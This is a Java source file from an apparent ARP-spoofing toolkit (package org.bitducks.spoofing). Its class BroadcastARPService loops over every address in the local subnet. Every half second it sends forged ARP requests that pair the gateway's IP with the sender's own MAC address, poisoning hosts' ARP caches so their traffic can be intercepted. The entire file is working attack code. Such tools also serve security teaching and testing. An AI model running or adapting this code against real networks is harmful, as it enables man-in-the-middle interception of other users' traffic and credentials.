package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.scan.IpRangeIterator;
import org.bitducks.spoofing.util.IpUtil;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

public class BroadcastARPService extends Service {
	private InterfaceInfo infoInterface;
	private IpRangeIterator ipRange;
	private InetAddress gateway;
	
	public BroadcastARPService() {
		infoInterface = Server.getInstance().getInfo();
		InetAddress firstIp = IpUtil.network(infoInterface.getDevice());
		InetAddress lastIp = IpUtil.lastIpInNetwork(infoInterface.getDevice());
		ipRange = new IpRangeIterator(firstIp, lastIp);
		try {
			gateway = GatewayFinder.find(infoInterface.getDevice());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void run() {
		while(! this.isCloseRequested()){
			broadcastSpoof();
			
			//Waiting 500ms to be sure we don't use all the CPU
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	private void broadcastSpoof() {
		ARPPacket spoofedPacket = PacketFactory.arpRequest(infoInterface.getMacAddress(), gateway, getNextIp());
		System.out.println(spoofedPacket.toString());
		Server.getInstance().sendPacket(spoofedPacket);
	}
	
	private InetAddress getNextIp() {
		if(! ipRange.hasNext()) {
			ipRange.reset();
		}
		return ipRange.next();
	}
}
